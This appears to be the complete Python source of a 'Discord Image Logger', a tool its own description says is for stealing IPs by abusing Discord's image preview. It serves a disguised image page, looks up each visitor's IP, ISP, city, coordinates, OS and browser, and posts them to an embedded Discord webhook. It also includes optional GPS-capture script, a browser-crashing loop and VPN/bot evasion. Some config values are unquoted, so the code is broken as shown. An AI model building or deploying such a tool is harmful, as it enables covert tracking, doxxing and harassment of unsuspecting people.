# Discord Image Logger
# By Dexty | https://github.com/xdexty0

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "Dexty"

config = {
    # BASE CONFIG #
    "webhook": https://discord.com/api/webhooks/1405282683319222483/Q2IE7aHE39N3vkM5yQCf0cMVOGhoYulHjwo16EYjMxvFDK6BE9YdwaBPIcsRv5RrjQBp,
    "image":data:image/jpeg;base64,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, # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/xdexty0

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
